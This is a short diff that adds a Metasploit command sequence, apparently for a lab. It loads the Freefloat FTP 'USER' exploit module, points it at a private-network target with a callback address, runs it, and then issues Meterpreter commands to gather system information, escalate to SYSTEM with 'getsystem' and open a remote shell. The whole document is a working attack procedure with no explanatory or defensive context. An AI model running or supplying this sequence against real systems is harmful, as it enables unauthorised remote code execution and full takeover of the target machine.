@@ -1,0 +1,13 @@
+search freefloat
+use 0
+
+use exploit/windows/ftp/freefloatftp_user
+
+set RHOSTS 192.168.2.2
+set LHOST 192.168.2.4
+
+run
+
+sysinfo
+getsystem
+shell
